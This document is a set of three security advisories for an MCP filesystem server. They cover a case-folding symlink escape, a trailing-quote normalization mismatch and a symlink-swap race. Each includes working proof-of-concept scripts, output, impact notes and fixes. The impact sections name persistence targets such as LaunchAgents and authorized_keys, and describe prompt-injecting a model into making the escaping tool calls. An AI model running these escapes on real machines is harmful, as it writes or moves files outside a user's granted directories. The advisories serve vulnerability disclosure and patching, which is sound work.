description:
### Summary

On a case-insensitive file system, `server-filesystem` 2026.8.31, 1.0.0 and 2.0.0 create files and directories outside the allowed directories through `create_directory`, `write_file` and the destination of `move_file`, if an allowed directory contains a symlink that points out and the request spells the symlink's name with different letter case. `resolveUnicodeEquivalentPath()` compares path components with `fs.readdir()` entries as strings, so `LINK` does not match `link`; it returns the rest of the path without a `realpath()`, and the OS follows the symlink when it creates the file.

macOS (APFS) and Windows (NTFS) are case-insensitive by default. I reproduced this on Linux with a case-folded tmpfs and have not run it on macOS or Windows. Only new files and directories can be created, existing files outside stay protected. It is a regression: 2026.7.10 refuses these requests.

### Details

`validatePath()` first calls `fs.realpath()` on the requested path. For a path that does not exist yet this fails with `ENOENT`, and `validatePath()` hands over to `resolveUnicodeEquivalentPath()` ([lib.ts#L256-L258](https://github.com/modelcontextprotocol/servers/blob/51b6382a3e827aceb6bce430b1208d69b93d95ea/src/filesystem/lib.ts#L256-L258)). That function starts at the real path of the allowed directory and walks the requested path one component at a time ([lib.ts#L157-L191](https://github.com/modelcontextprotocol/servers/blob/51b6382a3e827aceb6bce430b1208d69b93d95ea/src/filesystem/lib.ts#L157-L191)):

```ts
const entries = (await fs.readdir(currentPath)) ?? [];
const exactMatch = entries.find((entry) => entry === requestedPart);
const equivalentMatches = exactMatch
  ? [exactMatch]
  : entries.filter(
      (entry) => unicodeMatchKey(entry) === unicodeMatchKey(requestedPart),
    );
...
if (equivalentMatches.length === 0) {
  // Nothing below this point exists yet, so there are no symlinks left to
  // resolve. ...
  return path.join(currentPath, ...relativeParts.slice(index));
}
```

([lib.ts#L159-L176](https://github.com/modelcontextprotocol/servers/blob/51b6382a3e827aceb6bce430b1208d69b93d95ea/src/filesystem/lib.ts#L159-L176).) For an entry that matches, the loop runs `fs.realpath()` and checks the result against the allowed directories. The matching is a string comparison: `unicodeMatchKey` ([lib.ts#L100-L102](https://github.com/modelcontextprotocol/servers/blob/51b6382a3e827aceb6bce430b1208d69b93d95ea/src/filesystem/lib.ts#L100-L102)) normalizes to NFC and maps Unicode spaces to U+0020 but keeps letter case. So with a symlink `link -> /outside` in the allowed directory, a request for `LINK/a` finds no entry called `LINK`, the function returns `<allowed>/LINK/a` unchecked, and on a case-insensitive file system `mkdir` or `open` resolves `LINK` through `link`.

The case-varied component does not have to be the symlink. In `SUB/ln2/x`, with `sub/ln2 -> /outside`, the walk stops at `SUB` and never looks at `ln2`, even though `ln2` is spelled exactly. So a fix that checks only the first missing component is not enough.

History: before 2026.8.31 `validatePath()` ran `fs.realpath()` on the parent directory, so the OS did the case folding and `LINK/a` was refused. PR #4638 replaced that with the `readdir` walk; there, an unmatched component that was not the last one still raised "Parent directory does not exist". PR #4631 (issue #4629), merged on top of it, changed that branch to return the unchecked rest of the path so that `create_directory` can create nested directories. Both first shipped in 2026.8.31. The existing symlink test (`refuses a new path under a symlinked directory that leaves (#4629)`) uses the exact spelling only. The class is the one in GHSA-q66q-fx2p-7w4m (CVE-2025-53109): reaching files outside the allowed directories through symlinks inside them.

Suggested fix: when no entry matches by spelling, pass the requested name to `fs.realpath()` as it is, so the OS applies whatever case folding or aliasing the file system has, and check containment at every step. Only a name that neither resolves nor exists under `lstat` is treated as the start of the missing tail. A dangling symlink still fails like it does today. I have this as a patch with tests (the `lib.ts` change is below, the tests are in `server-paths.test.ts`) and can open a PR against the private fork:

```diff
diff --git a/src/filesystem/lib.ts b/src/filesystem/lib.ts
index abb6b09..0a52573 100644
--- a/src/filesystem/lib.ts
+++ b/src/filesystem/lib.ts
@@ -133,6 +133,18 @@ function respellAllowedDirectoryPrefix(
   return absolutePath;
 }
 
+// Whether a directory entry of this name exists, without following it: a
+// dangling symlink does, a name nothing was created under does not.
+async function entryExists(entryPath: string): Promise<boolean> {
+  try {
+    await fs.lstat(entryPath);
+    return true;
+  } catch (error) {
+    if ((error as NodeJS.ErrnoException).code === "ENOENT") return false;
+    throw error;
+  }
+}
+
 async function resolveUnicodeEquivalentPath(
   absolutePath: string,
   allowedDirectories: readonly string[],
@@ -168,16 +180,33 @@ async function resolveUnicodeEquivalentPath(
       throw new Error(`Ambiguous Unicode path component: ${requestedPart}`);
     }
 
-    if (equivalentMatches.length === 0) {
-      // Nothing below this point exists yet, so there are no symlinks left to
-      // resolve. currentPath is already realpath'd and inside an allowed
-      // directory; append the missing tail so create_directory can mkdir -p it.
-      return path.join(currentPath, ...relativeParts.slice(index));
-    }
-
-    currentPath = await fs.realpath(
-      path.join(currentPath, equivalentMatches[0]),
+    // An entry whose name matches by spelling is looked up by that name. When
+    // none does, the requested name is still handed to the OS as it is: on a
+    // case-insensitive file system (macOS APFS/HFS+ and Windows NTFS by
+    // default) it can name an existing entry spelled with other letter case,
+    // and that entry can be a symlink that leaves the allowed directories.
+    const candidate = path.join(
+      currentPath,
+      equivalentMatches[0] ?? requestedPart,
     );
+    try {
+      currentPath = await fs.realpath(candidate);
+    } catch (error) {
+      if (
+        equivalentMatches.length === 0 &&
+        (error as NodeJS.ErrnoException).code === "ENOENT" &&
+        !(await entryExists(candidate))
+      ) {
+        // Nothing below this point exists yet, so there are no symlinks left
+        // to resolve. currentPath is already realpath'd and inside an allowed
+        // directory; append the missing tail so create_directory can mkdir -p
+        // it.
+        return path.join(currentPath, ...relativeParts.slice(index));
+      }
+      // A dangling symlink also fails realpath with ENOENT; it is reported
+      // like any other failure rather than treated as a missing name.
+      throw error;
+    }
     if (
       !isPathWithinAllowedDirectories(
         normalizePath(currentPath),
```

Three of the four new tests in `server-paths.test.ts` skip themselves on a case-sensitive file system; the fourth checks that there a differently-cased name is just a new directory. I have not run the patch on macOS or Windows; it relies on `fs.realpath()` following a differently-cased symlink name there, as it does on the casefolded mount.

One related hardening note, not a separate claim: the first step of the same function, `fs.realpath(allowedDirectory)` ([lib.ts#L151](https://github.com/modelcontextprotocol/servers/blob/51b6382a3e827aceb6bce430b1208d69b93d95ea/src/filesystem/lib.ts#L151)), is not checked against the allow-list. If an allowed directory itself is swapped for a symlink after the server started, new paths below it land in the symlink's target; that needs write access to the directory's parent, so I rate it low. A containment check on `currentPath` right after that line closes it (I tried it on Linux, the full suite passes). The patch above does not include it.

### Proof of concept

Server: `@modelcontextprotocol/server-filesystem` 2.0.0 from npm (also run: 2026.8.31, 1.0.0, and a build of `51b6382` = current `main`). Configuration: one allowed directory as the only command-line argument, no Roots. Client: a small hand-written stdio JSON-RPC client (below), protocol version `2025-06-18`, no capabilities. Host: Linux 7.2.11 (Fedora), Node v22.22.2 (2.0.0 declares `engines.node >=24`; it ran on 22 regardless).

A case-insensitive file system is needed. Without root, a case-folded tmpfs in a user namespace does it: `unshare -rm`, `mount -t tmpfs -o casefold`, `chattr +F` on a directory. This needs unprivileged user namespaces, `chattr`, and a kernel with casefold support in tmpfs (I believe 6.13 or newer; I used 7.2.11). The allowed directory contains `link -> outside` (what a cloned repo could carry), `sub/ln2 -> outside` and a file `note.txt`.

```sh
mkdir mcp02-poc && cd mcp02-poc

cat > client.mjs <<'EOF'
// usage: node client.mjs <allowed-dir> <server command and args...>
// Minimal MCP stdio client: newline-delimited JSON-RPC, no dependencies.
import { spawn } from "node:child_process";
import path from "node:path";

const [allowed, cmd, ...cmdArgs] = process.argv.slice(2);
const server = spawn(cmd, [...cmdArgs, allowed], {
  stdio: ["pipe", "pipe", "inherit"],
});

const pending = new Map();
let buf = "";
server.stdout.setEncoding("utf8");
server.stdout.on("data", (chunk) => {
  buf += chunk;
  let nl;
  while ((nl = buf.indexOf("\n")) !== -1) {
    const msg = JSON.parse(buf.slice(0, nl));
    buf = buf.slice(nl + 1);
    if (msg.id !== undefined) pending.get(msg.id)?.(msg);
  }
});

let nextId = 1;
const rpc = (method, params) =>
  new Promise((resolve, reject) => {
    const id = nextId++;
    const timer = setTimeout(() => reject(new Error(`timeout: ${method}`)), 20000);
    pending.set(id, (msg) => {
      clearTimeout(timer);
      resolve(msg);
    });
    server.stdin.write(JSON.stringify({ jsonrpc: "2.0", id, method, params }) + "\n");
  });

await rpc("initialize", {
  protocolVersion: "2025-06-18",
  capabilities: {},
  clientInfo: { name: "poc-client", version: "0.0.0" },
});
server.stdin.write(
  JSON.stringify({ jsonrpc: "2.0", method: "notifications/initialized" }) + "\n",
);

async function tool(label, name, args) {
  const res = await rpc("tools/call", { name, arguments: args });
  const text = res.error
    ? `JSON-RPC error: ${res.error.message}`
    : res.result.content.map((c) => c.text).join("\n");
  console.log(`${label.padEnd(34)} -> ${res.result?.isError ? "ERROR: " : ""}${text}`);
}

const p = (...parts) => path.join(allowed, ...parts);
await tool("create_directory link/a (control)", "create_directory", { path: p("link", "a") });
await tool("create_directory LINK/a", "create_directory", { path: p("LINK", "a") });
await tool("write_file Link/pwned.txt", "write_file", {
  path: p("Link", "pwned.txt"),
  content: "written outside the allowed directory\n",
});
await tool("write_file SUB/ln2/nested.txt", "write_file", {
  path: p("SUB", "ln2", "nested.txt"),
  content: "written outside the allowed directory\n",
});
await tool("move_file note.txt -> lInK/moved.txt", "move_file", {
  source: p("note.txt"),
  destination: p("lInK", "moved.txt"),
});
server.kill();
EOF

cat > run.sh <<'EOF'
# usage: unshare -rm sh run.sh <server command and args...>
# needs a kernel with casefold support in tmpfs, node, chattr
set -e
HERE=$(cd "$(dirname "$0")" && pwd)
CF=$(mktemp -d)                            # becomes the case-insensitive mount
trap 'cd /; umount "$CF"; rmdir "$CF"' EXIT
mount -t tmpfs -o casefold tmpfs "$CF"
mkdir "$CF/work" && chattr +F "$CF/work"   # +F: this directory and its children fold case
ALLOWED="$CF/work/allowed"                 # the only directory the server is given
OUTSIDE="$CF/work/outside"                 # a sibling, not an allowed directory
mkdir -p "$ALLOWED/sub" "$OUTSIDE"
echo "top secret" > "$OUTSIDE/secret.txt"
echo "a file inside the allowed directory" > "$ALLOWED/note.txt"
ln -s "$OUTSIDE" "$ALLOWED/link"           # what a cloned repo could carry
ln -s "$OUTSIDE" "$ALLOWED/sub/ln2"

echo "# lstat of the case variant LINK:"
stat -c '%N' "$ALLOWED/LINK"
echo
node "$HERE/client.mjs" "$ALLOWED" "$@"
echo
echo "# directory outside the allowed directory:"
ls -R "$OUTSIDE"
EOF

unshare -rm sh run.sh npx -y @modelcontextprotocol/server-filesystem@2.0.0
```

For a source checkout, build it first (`npm ci --ignore-scripts && (cd src/filesystem && npm run build)`) and replace the last line with `unshare -rm sh run.sh node /path/to/servers/src/filesystem/dist/index.js`.

Expected: the four case-variant calls are refused like the control call (`link/a`). Actual on 2.0.0, 2026.8.31, 1.0.0 and `51b6382` (output of the `51b6382` build; server stderr lines left out, temp names shortened):

```text
# lstat of the case variant LINK:
'/tmp/tmp.XXXXXXXXXX/work/allowed/LINK' -> '/tmp/tmp.XXXXXXXXXX/work/outside'

create_directory link/a (control)  -> ERROR: Access denied - symlink target outside allowed directories: /tmp/tmp.XXXXXXXXXX/work/outside not in /tmp/tmp.XXXXXXXXXX/work/allowed
create_directory LINK/a            -> Successfully created directory /tmp/tmp.XXXXXXXXXX/work/allowed/LINK/a
write_file Link/pwned.txt          -> Successfully wrote to /tmp/tmp.XXXXXXXXXX/work/allowed/Link/pwned.txt
write_file SUB/ln2/nested.txt      -> Successfully wrote to /tmp/tmp.XXXXXXXXXX/work/allowed/SUB/ln2/nested.txt
move_file note.txt -> lInK/moved.txt -> Successfully moved /tmp/tmp.XXXXXXXXXX/work/allowed/note.txt to /tmp/tmp.XXXXXXXXXX/work/allowed/lInK/moved.txt

# directory outside the allowed directory:
/tmp/tmp.XXXXXXXXXX/work/outside:
a
moved.txt
nested.txt
pwned.txt
secret.txt

/tmp/tmp.XXXXXXXXXX/work/outside/a:
```

The files and directories were created in `outside`, and `note.txt` was moved out of the allowed directory. `LINK`, `Link`, `lInK` and `SUB` are all just the OS accepting another spelling of an existing name. With the patch applied to `51b6382` the same script prints:

```text
# lstat of the case variant LINK:
'/tmp/tmp.XXXXXXXXXX/work/allowed/LINK' -> '/tmp/tmp.XXXXXXXXXX/work/outside'

create_directory link/a (control)  -> ERROR: Access denied - symlink target outside allowed directories: /tmp/tmp.XXXXXXXXXX/work/outside not in /tmp/tmp.XXXXXXXXXX/work/allowed
create_directory LINK/a            -> ERROR: Access denied - symlink target outside allowed directories: /tmp/tmp.XXXXXXXXXX/work/outside not in /tmp/tmp.XXXXXXXXXX/work/allowed
write_file Link/pwned.txt          -> ERROR: Access denied - symlink target outside allowed directories: /tmp/tmp.XXXXXXXXXX/work/outside not in /tmp/tmp.XXXXXXXXXX/work/allowed
write_file SUB/ln2/nested.txt      -> ERROR: Access denied - symlink target outside allowed directories: /tmp/tmp.XXXXXXXXXX/work/outside not in /tmp/tmp.XXXXXXXXXX/work/allowed
move_file note.txt -> lInK/moved.txt -> ERROR: Access denied - symlink target outside allowed directories: /tmp/tmp.XXXXXXXXXX/work/outside not in /tmp/tmp.XXXXXXXXXX/work/allowed

# directory outside the allowed directory:
/tmp/tmp.XXXXXXXXXX/work/outside:
secret.txt
```

On 2026.7.10 the same script refuses all five calls, control included (with the message `Parent directory does not exist: ...`, because the old check swallows its own "outside allowed directories" error), and `outside` only has `secret.txt`.

Reading, overwriting or editing an existing file through the case variant is refused at `51b6382` (v2.0.0 is the same commit): `read_text_file`, `write_file` and `edit_file` on `LINK/secret.txt`, and `list_directory` on `LINK`, all return "Access denied - symlink target outside allowed directories", because `fs.realpath()` of an existing path resolves the symlink.

The patch also adds regression tests to `src/filesystem/__tests__/server-paths.test.ts`. With `TMPDIR` pointing into a `chattr +F` directory on the same kind of mount, three of them fail at `51b6382` (the two escape tests, and the dangling-symlink test on its error message only) and all pass with the patch. On a case-sensitive file system the three are skipped.

### Impact

Anyone running `server-filesystem` 2026.8.31, 1.0.0 or 2.0.0 on a case-insensitive file system, which is the default on macOS (APFS) and Windows (NTFS), or on a case-folded volume elsewhere. No special configuration is needed beyond an allowed directory that contains a symlink pointing outside it.

The server cannot create symlinks, so the symlink has to come from somewhere else: a git repository or archive the user placed in an allowed directory can carry one (git checks symlinks out as symlinks on macOS and Linux). The attacker also has to get a tool call with the differently-cased path made, for example by prompt injection in a file the model reads, and has to know the victim's absolute path for the directory the symlink points to. On Windows, git does not create symlinks by default and creating one needs extra privileges, so macOS is the realistic target. I tested neither.

What the attacker gets is new files and directories, with chosen names and content, under the symlink's target outside the allowed directories, plus moving a file out of the allowed directory with `move_file`. Whether that matters depends on the target (a directory that a shell, launch agent or autostart mechanism reads from, for instance). Existing files outside cannot be read or overwritten this way.

## Upgrading from a date-versioned release

`@modelcontextprotocol/server-filesystem` moved from date versions (2025.x, 2026.x) to semantic versions in 1.0.0. Package managers rank 2.0.1 below every 2025.x and 2026.x version, so they will not offer it as an upgrade and Dependabot will not open one. If you are on a date version, install the fix explicitly: `npm install @modelcontextprotocol/server-filesystem@2.0.1` (or `@latest`).

### Summary

validatePath in src/filesystem/lib.ts performs the allowlist containment check on normalizePath(absolute) but runs fs.realpath and returns the result from the raw absolute string. normalizePath strips a trailing single quote, double quote, or whitespace character. Therefore a request for /allowed/proj' passes the containment check (it normalizes to /allowed/proj) while the file operation runs on /allowed/proj' - a sibling of the allowed directory. All 14 filesystem tools route through validatePath and are affected.

### Details

## Root cause

The affected function is validatePath in src/filesystem/lib.ts.

The bug is a check/use mismatch between two strings derived from the same input:

1. normalizePath strips a leading or trailing quote/whitespace character:
     p = p.trim().replace(/^["']|["']$/g, "");

2. The allowlist check runs on normalizePath(absolute):
     const normalizedRequested = normalizePath(absolute);
     const isAllowed = isPathWithinAllowedDirectories(normalizedRequested, allowedDirectories);

3. But the file operation and the returned value use the raw absolute string:
     const realPath = await fs.realpath(absolute);
     ...
     return realPath;

Because normalizePath strips a trailing `'`, `"`, or whitespace character, a request for /allowed/proj' passes the containment check (normalized to /allowed/proj) while fs.realpath and the returned value operate on /allowed/proj' - a real sibling of the allowed directory.

The post-realpath check runs on normalizePath(realPath), which strips the same character again, so it also passes.

## Affected tools

Every tool that routes through validatePath in src/filesystem:

read_file, read_text_file, read_multiple_files, read_media_file,
write_file, edit_file, create_directory,
list_directory, list_directory_with_sizes, directory_tree,
move_file, search_files, get_file_info,
list_allowed_directories (no path input, not affected in practice)

## Impact

Read, write, move, and stat operations can be performed on paths outside the configured allowed directories, provided a sibling path with a trailing quote/whitespace exists. An attacker who can create such a sibling via the write tools can chain a write plus a read to escape the sandbox.

### Proof of concept

## Environment

- Server: @modelcontextprotocol/server-filesystem (filesystem server, src/filesystem)
- Node.js: 20.x
- Commit tested: latest main as of 2026-10-14

## Reproduction

The following TypeScript test imports the real validatePath from the server's compiled output and demonstrates the escape. Run it from within src/filesystem after `npm install`:

```
  import { validatePath } from "./lib.js";
  import fs from "fs/promises";
  import path from "path";
  import os from "os";

  (async () => {
    const sandbox = await fs.mkdtemp(path.join(os.tmpdir(), "mcp_real_"));
    const allowedProj = path.join(sandbox, "allowed/proj");
    const siblingEvil = path.join(sandbox, "allowed/proj'");

    await fs.mkdir(allowedProj, { recursive: true });
    await fs.mkdir(siblingEvil, { recursive: true });
    await fs.writeFile(path.join(siblingEvil, "SECRET.txt"), "OUTSIDE");

    const validated = await validatePath(sandbox + "/allowed/proj'", [allowedProj]);
    // validated === sandbox + "/allowed/proj'" - OUTSIDE the allowlist

    const content = await fs.readFile(path.join(validated, "SECRET.txt"), "utf-8");
    // content === "OUTSIDE" - the escape succeeded

    await fs.rm(sandbox, { recursive: true, force: true });
  })();
```

Run with: npx tsx verify_escape.ts

## Observed output

  validatePath returned: /tmp/mcp_real_y5nErv/allowed/proj'
  🚨 SECRET READ: This file is OUTSIDE the allowlist

The returned path is outside the allowlist, and reading from it succeeded.

### Impact

An attacker who can influence the arguments of a filesystem tool (for example via prompt injection in a document, webpage, or codebase the LLM is reading) can cause read, write, move, and stat operations to occur on files outside the configured allowed directories.

- Confidentiality: read of files outside the sandbox if a sibling path with a trailing quote/whitespace exists.
- Integrity: write and move of files outside the sandbox under the same precondition.
- Chaining: the write tools can create the sibling path, making the precondition trivially satisfiable.

This bypasses the boundary the server claims to enforce ("Only works within allowed directories").

## Upgrading from a date-versioned release

`@modelcontextprotocol/server-filesystem` moved from date versions (2025.x, 2026.x) to semantic versions in 1.0.0. Package managers rank 2.0.1 below every 2025.x and 2026.x version, so they will not offer it as an upgrade and Dependabot will not open one. If you are on a date version, install the fix explicitly: `npm install @modelcontextprotocol/server-filesystem@2.0.1` (or `@latest`).

## Summary

`validatePath()` in `lib.js` contains an ENOENT fallback intended to permit creation of new files whose parents exist inside an allowed directory. The fallback resolves only the *parent* directory through `fs.realpath()`, validates the parent against `allowedDirectories`, and then **returns the original `absolute` path unchanged** rather than the canonicalised join of the realpath-resolved parent with the basename. Every caller (`write_file`, `edit_file`, `create_directory`, `move_file`) immediately invokes a filesystem syscall on this un-canonicalised path. Between the parent-realpath check and the syscall, a separate local process can replace the parent directory with a symbolic link that points outside the allowed tree. The kernel resolves the symlink at syscall time, and the write, mkdir, or rename lands at the attacker-chosen destination. This produces arbitrary file write outside `allowedDirectories`, and via `move_file` arbitrary file relocation, including exfiltration outside the protected tree. The class is distinct from CVE-2025-53109 (symlink target validation) and CVE-2025-53110 (prefix-match containment), both fixed in 2025.7.1: neither patch added re-resolution of the parent after the ENOENT branch returns, and neither addresses a symlink that comes into existence *after* `validatePath()` completes.

### Root cause

`dist/lib.js`, function `validatePath`, lines (approximately) 30-90. The defect is the literal `return absolute;` on the ENOENT path. `absolute` was produced by `path.resolve()` on the caller-supplied request; it is *not* the canonical on-disk path. If `parentDir` is itself a symlink at the moment of the syscall, the kernel dereferences that symlink at syscall time, and the resulting on-disk location is wherever the symlink currently points, not the location whose realpath was validated.

The fix is straightforward: the function should return `path.join(realParentPath, path.basename(absolute))` so that the caller's syscall operates on the path whose parent has been canonicalised and approved.

### Call sites that use the returned value verbatim

Each of the following request handlers calls `validatePath` and then immediately performs a filesystem syscall on the returned string. There is an inter-statement window between the validation and the syscall (in some cases an additional `await` between them):

- `index.js:343-344` `write_file`:
  ```js
  const validPath = await validatePath(parsed.data.path);
  await writeFileContent(validPath, parsed.data.content);   // -> fs.writeFile inside writeFileContent
  ```
- `index.js:355` `edit_file`:
  ```js
  const validPath = await validatePath(parsed.data.path);
  // applyFileEdits opens, edits, writes via tmp + rename
  ```
- `index.js:366` `create_directory`:
  ```js
  const validPath = await validatePath(parsed.data.path);
  await fs.mkdir(validPath, { recursive: true });
  ```
- `index.js:474-476` `move_file`:
  ```js
  const validSourcePath = await validatePath(parsed.data.source);
  const validDestPath = await validatePath(parsed.data.destination);
  await fs.rename(validSourcePath, validDestPath);
  ```

In `move_file`, the destination commonly does not exist, so the destination's `validatePath` call hits the ENOENT branch.

### Race window

The race window is the interval between `validatePath()` returning to the caller and the subsequent filesystem syscall reaching the kernel. In practice this includes at least:

1. JavaScript microtask drain after the awaited `validatePath` returns.
2. Argument marshalling for the next call (`writeFileContent`, `fs.mkdir`, `fs.rename`).
3. For `write_file`, an additional `await fs.writeFile(...)` setup (`lib.js:96-123` constructs a tmp path, then renames into place; both syscalls happen after the validation).
4. For `edit_file`, an entire read-modify-write cycle (`lib.js:127-198`), which widens the window enormously.

Any concurrently running process running as the same user can, within this window, `rmdir` the previously-real `parentDir` and `symlink` it to an attacker-chosen target. The kernel resolves the symlink at the moment of the eventual `open`/`mkdir`/`rename` syscall.


## Proof of Concept

The script below imports the installed package directly and demonstrates the bug deterministically on macOS. It is self-contained: it constructs its own workspace under the system temp directory, sets the allowed directory to a freshly-created subdirectory, performs the validate + write sequence with an interposed symlink swap, and then checks whether the write landed outside the allow-list. Replace `LIB_PATH` with the path to the installed package's `dist/lib.js` (Anthropic Claude Desktop users will find it under the Filesystem extension's installation directory; direct `npm` users will find it under `node_modules/@modelcontextprotocol/server-filesystem/dist/lib.js`).

```js
import fs from 'node:fs/promises';
import path from 'node:path';
import os from 'node:os';
import { pathToFileURL } from 'node:url';

// Path to the installed package's lib.js. Adjust for your install location.
const LIB_PATH = '/PATH/TO/server-filesystem/dist/lib.js';

const { setAllowedDirectories, validatePath, writeFileContent } =
  await import(pathToFileURL(LIB_PATH).href);

// Realpath the workspace root so macOS /var vs /private/var does not
// confuse the server's first-pass string-prefix containment check.
await fs.mkdir(path.join(os.tmpdir(), 'fs-toctou-poc'), { recursive: true });
const ROOT = await fs.realpath(path.join(os.tmpdir(), 'fs-toctou-poc'));
const ALLOWED = path.join(ROOT, 'allowed');
const OUTSIDE = path.join(ROOT, 'outside');
const FLIP = path.join(ALLOWED, 'flip');

async function reset() {
  await fs.rm(ROOT, { recursive: true, force: true });
  await fs.mkdir(ALLOWED, { recursive: true });
  await fs.mkdir(OUTSIDE, { recursive: true });
  await fs.mkdir(FLIP, { recursive: true });
}

await reset();
setAllowedDirectories([await fs.realpath(ALLOWED)]);

const REQUESTED = path.join(FLIP, 'created.txt');

// 1) Validate. The leaf does not exist (ENOENT), so the parent-dir fallback
//    fires. Parent is allowed/flip, a real dir inside allowed: passes.
console.log('[*] Calling validatePath...');
const validated = await validatePath(REQUESTED);
console.log('[*] validatePath returned:', validated);

// 2) Between validation and write, swap the parent dir for a symlink.
//    In the real server this race window exists between validatePath()
//    and writeFileContent() in the request handler.
console.log('[*] Race: replacing flip dir with symlink to outside...');
await fs.rm(FLIP, { recursive: true });
await fs.symlink(OUTSIDE, FLIP);

// 3) Write through the validated (now stale) path. The kernel resolves
//    the parent symlink at syscall time; the write lands outside.
console.log('[*] Writing through validated path...');
await writeFileContent(validated, 'pwned-via-toctou');

// 4) Verify.
const outsideListing = await fs.readdir(OUTSIDE);
const allowedListing = await fs.readdir(ALLOWED, { withFileTypes: true });
console.log('[*] Files now in outside/:', outsideListing);
console.log('[*] Entries in allowed/:',
  allowedListing.map(e => `${e.isSymbolicLink()?'L':e.isDirectory()?'D':'F'} ${e.name}`));

if (outsideListing.includes('created.txt')) {
  console.log('[!!] SUCCESS: file written OUTSIDE allowed directories.');
} else {
  console.log('[--] FAILED: write did not escape.');
}
```

### Observed output

```
[*] Calling validatePath...
[*] validatePath returned: /private/var/folders/.../T/fs-toctou-poc/allowed/flip/created.txt
[*] Race: replacing flip dir with symlink to outside...
[*] Writing through validated path...
[*] Files now in outside/: [ 'created.txt' ]
[*] Entries in allowed/: [ 'L flip' ]
[!!] SUCCESS: file written OUTSIDE allowed directories.
```

The `validatePath` call returned a path whose canonical resolution would have been `allowed/flip/created.txt` at the moment of validation, but which, after the parent swap, resolves through the symlink to `outside/created.txt`. The post-condition listing shows `created.txt` in `outside/`, confirming the escape. The post-condition listing of `allowed/` shows the entry `flip` is now a symlink (`L`), not a directory; that is the artefact of the swap.

### `move_file` variant (information disclosure)

The same primitive applied to `move_file` produces information disclosure plus tampering. The harness places a sensitive file inside the allowed tree, requests `move_file` with a destination inside `allowed/flip/`, and performs the same swap between the destination's `validatePath` (which hits the ENOENT branch) and the subsequent `fs.rename`. The script differs from the write-file PoC only in the action between steps 1 and 4:

```js
// Stage a sensitive file inside the allowed tree.
const SRC = path.join(ALLOWED, 'sensitive.txt');
await fs.writeFile(SRC, 'TOP-SECRET-CREDENTIAL-MATERIAL\n');
const DST = path.join(FLIP, 'moved.txt');

const validSrc = await validatePath(SRC);
const validDst = await validatePath(DST);

// Swap on dst parent
await fs.rm(FLIP, { recursive: true });
await fs.symlink(OUTSIDE, FLIP);

await fs.rename(validSrc, validDst);

const exfilled = await fs.readFile(path.join(OUTSIDE, 'moved.txt'), 'utf8');
console.log('[!!] EXFIL bytes:', JSON.stringify(exfilled));
```

`sensitive.txt` is renamed *out* of the allowed tree into `outside/moved.txt`. The original file no longer exists inside the allowed tree, and a copy of its contents now lives at an attacker-chosen location.

### Cross-process exploitation

The deterministic PoC above performs the swap inside the same Node process for a 100% reproducible demonstration of the underlying defect. The same defect is reachable when the racing process is a separate operating-system process running as the same user, by spawning a child process that loops `rm + symlink` continuously while a sequence of MCP write or move requests is sent to the live server over its stdio JSON-RPC interface. On the test machine, a hot-loop racer in a separate OS process landed an escape on the order of one trial per thousand against the live server's `write_file` and `move_file` tool calls; this corresponds to a real attacker running the racer continuously, where any single landing crosses the trust boundary. 

### Reproduction directory layout

The PoC creates the following tree under the operating system temp directory:

- `<tmp>/fs-toctou-poc/allowed/`: the configured allowed directory.
- `<tmp>/fs-toctou-poc/outside/`: the attacker's chosen destination, outside the allow-list.
- `<tmp>/fs-toctou-poc/allowed/flip/`: child of allowed dir, initially a real directory; gets swapped to a symlink during the race window.

On macOS the temp root is realpath-resolved through `/private/var/folders/...` rather than `/var/folders/...` so that the server's first-pass string-prefix containment check matches the realpath-resolved allow-list.

All PoC artefacts are confined to the system temp directory.

### Reproduction steps

1. Install `@modelcontextprotocol/server-filesystem` .
2. Save the PoC script above. Update `LIB_PATH` to the install location of `dist/lib.js`.
3. Run with `node <script>.js`.
4. Observe `[!!] SUCCESS` and the `created.txt` file inside `<tmp>/fs-toctou-poc/outside/`.

## Impact

## Impact

1. **Arbitrary file write outside `allowedDirectories`.** Attacker chooses both the destination path (via where the swap symlink points) and the file contents (via the tool argument). On macOS with the default APFS, no integrity protection blocks writes inside `$HOME` and most of `/Users`. Concrete misuse targets: `~/Library/LaunchAgents/<name>.plist` (persistence), `~/.zshrc` or `~/.bashrc` (shell hijack), `~/.ssh/authorized_keys` (remote access), the Claude Desktop configuration directory (poison further MCP wiring on next launch).

2. **Arbitrary file move via `move_file`.** Any file the server is allowed to read can be renamed across the swapped destination parent into an attacker-chosen directory. Because `rename` is atomic and removes the source, this is both exfiltration (the data ends up at a path readable by other processes) and destruction (the file is no longer where the user expects it).

3. **Arbitrary directory creation via `create_directory`.** Same primitive applied to `mkdir`. Useful for staging, for example creating a directory inside `~/Library/LaunchAgents/` if it did not exist.

4. **Chains with indirect prompt injection.** The "victim user invokes Claude" scenario does not require the user to type a malicious request. Any attacker-controlled content drawn into the model's context (a web page fetched by another extension, a file inside the allowed tree, a clipboard paste) can prompt-inject the model into emitting the necessary `write_file`, `move_file`, or `edit_file` tool call. The on-host racer is then the only remaining attacker capability needed.

5. **Confidentiality scope is Changed.** The `allowedDirectories` configuration is the entire security boundary of the extension. A successful escape breaks the user-facing promise that "Claude can only touch these folders."

## Windows: partly fixed

On Linux and macOS, 2.0.1 anchors each write to the directory it validated, so swapping a parent directory for a symlink between the check and the write is refused.

**On Windows this is only partly fixed.** Node.js resolves every file operation on Windows from a path string rather than from a directory handle, so the server cannot anchor a write to the directory it checked. A directory on the path that is swapped for a junction between the check and the write (creating a junction needs no special privilege) can still redirect `write_file`, `edit_file`, `create_directory` and the destination of `move_file` outside the allowed directories.

Until that is fixed, on Windows do not configure an allowed directory that another user or an untrusted local process can write to. A complete Windows fix needs native code and is tracked in [#5260](https://github.com/modelcontextprotocol/servers/issues/5260).

## Upgrading from a date-versioned release

`@modelcontextprotocol/server-filesystem` moved from date versions (2025.x, 2026.x) to semantic versions in 1.0.0. Package managers rank 2.0.1 below every 2025.x and 2026.x version, so they will not offer it as an upgrade and Dependabot will not open one. If you are on a date version, install the fix explicitly: `npm install @modelcontextprotocol/server-filesystem@2.0.1` (or `@latest`).
